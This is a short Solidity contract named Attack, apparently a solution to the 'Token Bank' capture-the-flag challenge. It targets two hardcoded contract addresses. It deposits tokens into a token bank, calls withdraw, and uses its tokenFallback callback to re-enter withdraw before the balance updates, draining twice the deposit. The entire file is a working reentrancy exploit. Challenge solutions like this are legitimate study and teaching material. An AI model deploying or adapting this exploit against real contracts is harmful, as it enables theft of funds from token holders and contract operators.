pragma solidity ^0.4.21;

import 'bachang2/Tokenbanks.sol';

contract Attack{
    address TokenBank = 0x12B74819aA2b9a6e7Bc49E9ad4a14abd5C9da265;
    address Token = 0x4F2A3330644e895AD7341fDb5306a3aDE9Be15a6;
    uint256 number;
    
    SimpleERC223Token TokenTarget;
    TokenBankChallenge TokenBankTarget;
    
    constructor() public{
        TokenTarget = SimpleERC223Token(Token);
        TokenBankTarget = TokenBankChallenge(TokenBank);
    }
    
    function transferToBank() public{
        TokenTarget.transfer(TokenBank,500000 * 10**18);
    }
    
    function attack() public{
        TokenBankTarget.withdraw(500000 * 10**18);
    }
    
    function tokenFallback(address from, uint256 value, bytes data) public {
        number += 1;
        if(number <=1){
            TokenBankTarget.withdraw(500000 * 10**18);
        }
    }
    
    function() public payable{}
    
}